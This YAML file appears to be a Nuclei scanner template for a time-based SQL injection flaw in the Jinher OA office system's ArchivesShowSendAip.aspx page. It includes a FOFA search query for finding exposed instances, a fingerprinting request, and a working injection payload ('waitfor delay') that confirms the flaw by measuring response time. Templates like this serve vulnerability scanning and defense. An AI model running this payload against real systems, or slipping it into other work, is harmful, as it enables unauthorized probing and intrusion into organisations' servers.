id: poc-yaml-jinher-archivesshowsendaip-aspx-sqli
info:
  name: 金和OA ArchivesShowSendAip.aspx SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    fingerprint: 金和OA
    fofa-query: app="金和网络-金和OA"

variables:
  t1: "{{rand_int(5,10)}}"
  t2: "{{to_number(t1)*3}}"
  t3: "{{to_number(t2)+2}}"

http:
  - raw:
      - |
        GET /C6/Jhsoft.Web.login/PassWordSlideFull.aspx HTTP/1.1
        Host: {{Hostname}}
    matchers:
      - type: word
        part: body
        words:
          - "JHSoft"

  - raw:
      - |
        GET /c6/Jhsoft.Web.Archives/ArchivesShowSendAip.aspx/?id=1'waitfor+delay'0:0:{{t1}}'-- HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "发文信息"
          - "文件类型"
          - "秘密等级"
      - type: dsl
        dsl:
          - "response_time >= to_number(t2)"
          - "response_time <= to_number(t3)"
